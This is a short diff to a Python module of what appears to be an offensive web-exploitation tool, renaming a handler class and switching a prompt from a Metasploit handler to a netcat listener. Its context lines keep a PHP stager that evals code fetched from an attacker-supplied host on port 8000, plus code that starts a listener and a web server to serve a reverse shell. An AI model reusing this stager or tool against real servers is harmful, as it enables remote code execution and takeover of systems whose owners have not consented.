@@ -1,7 +1,7 @@
 import subprocess
 from os.path import abspath, dirname, join
 
-from .utils import Payload, attack, colors, cook, msf_payload
+from .utils import listener, attack, colors, cook, msf_payload
 
 STAGER = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"
 HERE = abspath(dirname(__file__))
@@ -25,7 +25,7 @@ class Input:
         else:
             payload = STAGER.format(lhost, shell)
 
-        handle = Payload(lhost, lport)
+        handle = listener(lhost, lport)
         handle.handler()
 
         print(colors("[~] Starting Web Server ... ", 93))
@@ -37,7 +37,7 @@ class Input:
             print(colors("[!] Process Error", 91))
             print(e)
 
-        input(colors("[?] Press Enter To Continue When Your Metasploit Handler is Running ...", 94))
+        input(colors("[?] Press Enter To Continue When Your netcat listener is Running ...", 94))
 
         if self.cookies:
             cookies = cook(self.cookies)
